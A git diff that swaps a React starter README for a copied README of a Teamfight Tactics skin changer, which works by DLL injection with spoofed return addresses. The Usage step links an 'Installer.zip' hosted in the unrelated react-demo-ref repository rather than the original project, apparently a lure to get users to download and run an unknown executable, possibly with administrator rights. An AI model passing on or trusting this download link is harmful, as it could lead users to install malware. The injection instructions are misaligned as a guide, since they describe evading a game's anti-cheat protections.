@@ -1,68 +1,34 @@
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+<div align="center">
 
-## Available Scripts
+[![C++](https://img.shields.io/badge/Language-C%2B%2B-%23f34b7d.svg?style=plastic)](https://en.wikipedia.org/wiki/C%2B%2B)
+[![LOL](https://img.shields.io/badge/Game-Teamfight%20Tactics-445fa5.svg?style=plastic)](https://teamfighttactics.leagueoflegends.com/)
+[![Windows](https://img.shields.io/badge/Platform-Windows-0078d7.svg?style=plastic)](https://en.wikipedia.org/wiki/Microsoft_Windows)
+[![x86](https://img.shields.io/badge/Arch-x86-red.svg?style=plastic)](https://en.wikipedia.org/wiki/X86)
+[![License](https://img.shields.io/github/license/R3nzTheCodeGOD/R3nzSkinTFT.svg?style=plastic)](LICENSE)
+[![Issues](https://img.shields.io/github/issues/R3nzTheCodeGOD/R3nzSkinTFT.svg?style=plastic)](https://github.com/R3nzTheCodeGOD/R3nzSkin/issues)
+![Windows](https://github.com/R3nzTheCodeGOD/R3nzSkinTFT/workflows/Windows/badge.svg?branch=main&event=push)
 
-In the project directory, you can run:
+# **R3nzSkinTFT**
 
-### `npm start`
+![R3nzSkinTFT](https://user-images.githubusercontent.com/58574988/177463481-177c057d-c5a7-4f08-b1e5-4a1f910b81d6.gif)
 
-Runs the app in the development mode.<br />
-Open [http://localhost:3000](http://localhost:3000) to view it in the browser.
+`R3nzSkinTFT` is internal skin changer for Teamfight Tactics.
+</div>
 
-The page will reload if you make edits.<br />
-You will also see any lint errors in the console.
+- Change the skin of your little legend.
+- Semi-Automatic skins database update.
+- Change skins anytime and unlimited times in single game.
+- <a href="https://github.com/ocornut/imgui">ImGui</a> for in-game drawing.
+- <a href="https://github.com/nlohmann/json">JSON</a> based configuration saving & loading
+- Using <a href="https://github.com/danielkrupinski/x86RetSpoof">x86RetSpoof</a>, League functions are called with spoofed return address
 
-### `npm test`
+# Building
+1. Clone the source with `git clone --recursive https://github.com/R3nzTheCodeGOD/R3nzSkinTFT.git`
+2. Build in Visual Studio with configuration "RiotGamesServers"
 
-Launches the test runner in the interactive watch mode.<br />
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
-
-### `npm run build`
-
-Builds the app for production to the `build` folder.<br />
-It correctly bundles React in production mode and optimizes the build for the best performance.
-
-The build is minified and the filenames include the hashes.<br />
-Your app is ready to be deployed!
-
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
-
-### `npm run eject`
-
-**Note: this is a one-way operation. Once you `eject`, you can’t go back!**
-
-If you aren’t satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
-
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you’re on your own.
-
-You don’t have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn’t feel obligated to use this feature. However we understand that this tool wouldn’t be useful if you couldn’t customize it when you are ready for it.
-
-## Learn More
-
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
-
-To learn React, check out the [React documentation](https://reactjs.org/).
-
-### Code Splitting
-
-This section has moved here: https://facebook.github.io/create-react-app/docs/code-splitting
-
-### Analyzing the Bundle Size
-
-This section has moved here: https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size
-
-### Making a Progressive Web App
-
-This section has moved here: https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app
-
-### Advanced Configuration
-
-This section has moved here: https://facebook.github.io/create-react-app/docs/advanced-configuration
-
-### Deployment
-
-This section has moved here: https://facebook.github.io/create-react-app/docs/deployment
-
-### `npm run build` fails to minify
-
-This section has moved here: https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify
+# Usage
+1. Compile source or <a href="https://github.com/thiengat1/react-demo-ref/releases/download/123/Installer.zip">download</a> compiled version.
+2. Use `R3nzSkinTFT_Injector` or inject the resulting DLL into the game yourself.
+   - *Administrator* privilege may be needed if failed to inject.
+3. Press <kbd>Insert</kbd> to bring up the menu.
+4. Select skin for you.
